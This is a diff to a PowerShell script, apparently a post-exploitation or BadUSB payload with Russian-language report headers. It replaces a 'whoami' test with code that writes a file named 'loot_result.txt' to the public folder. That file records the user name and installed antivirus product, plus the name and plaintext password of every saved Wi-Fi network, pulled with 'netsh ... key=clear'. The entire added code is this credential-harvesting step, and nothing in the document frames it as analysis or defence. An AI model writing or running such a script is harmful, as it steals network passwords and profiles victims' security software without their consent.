@@ -1,2 +1,14 @@
-whoami > C:\Users\Public\out.txt
-sleep(50000)
+& {
+    $report = "C:\Users\Public\loot_result.txt"
+    "--- СБОР ДАННЫХ: $(Get-Date) ---" | Out-File $report
+    "User: $env:USERNAME" >> $report
+    "Antivirus: $(Get-WmiObject -Namespace root\SecurityCenter2 -Class AntiVirusProduct | Select-Object -ExpandProperty displayName)" >> $report
+    "--- WIFI ---" >> $report
+    netsh wlan show profiles | Select-String "\:(.+)$" | % {
+        $name = $_.Matches.Groups[1].Value.Trim()
+        netsh wlan show profile name="$name" key=clear | Select-String "Key Content\W+\:(.+)$" | % {
+            "$name : $($_.Matches.Groups[1].Value.Trim())" >> $report
+        }
+    }
+    "--- ИНФО ЗАВЕРШЕНА ---" >> $report
+}
